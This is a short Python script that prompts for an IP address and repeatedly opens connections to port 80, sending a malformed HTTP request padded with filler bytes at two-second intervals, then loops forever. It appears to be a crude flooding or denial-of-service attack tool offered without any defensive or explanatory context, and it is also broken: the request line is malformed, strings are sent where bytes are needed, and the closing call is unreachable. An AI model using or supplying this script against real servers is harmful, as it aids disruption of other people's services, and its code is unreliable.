from socket import *
import time

u = input("Enter ip")
for i in range(1,1000) :
    s = socket(AF_INET , SOCK_STREAM)
    s.connect((u , 80))
    pack = "A"*100
    s.send("GET / HTTP 1.1\r\n"+pack)
    time.sleep(2)

while True :
    popo = 0

s.close()